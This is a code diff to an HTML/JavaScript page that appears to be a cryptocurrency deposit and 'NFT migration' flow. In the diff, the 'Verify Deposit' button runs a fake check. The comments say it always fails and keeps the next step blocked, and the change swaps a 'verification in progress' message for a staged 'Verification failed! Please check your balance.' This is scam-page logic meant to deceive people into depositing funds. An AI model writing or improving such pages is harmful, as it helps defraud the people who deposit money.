@@ -364,9 +364,8 @@ body{
 <br>
             <button class="btn" onclick="verifyDeposit(this)">Verify Deposit</button>
 
-            <div id="fail2" class="loading-text hidden">
-    Verification in progress... It may take a while. Please be patient.
-</div>
+            <div id="fail2" class="failed hidden">
+                Verification failed! Please check your balance.
         </div>
 
         <!-- 4️⃣ MIGRATE PRIORITY PASS -->
@@ -643,15 +642,12 @@ function copyAddress(){
 
 /* ---------- Deposit verification (fails, blocks next step) ---------- */
 function verifyDeposit(btn){
-    setLoading(btn, true);
-    const loadingMsg = document.getElementById('fail2');
-    loadingMsg.classList.remove('hidden');
-
+    setLoading(btn,true);
     setTimeout(()=>{
-        setLoading(btn, false);
-        loadingMsg.classList.add('hidden');
-        // keep the next step blocked
-    }, 3000);   // <-- adjust the timeout if you want a longer/shorter spinner
+        setLoading(btn,false);
+        document.getElementById('fail2').classList.remove('hidden');
+        // keep next step blocked – do nothing else
+    },1200);
 }
 
 /* ---------- NFT migration (only reachable after a successful deposit) ---------- */
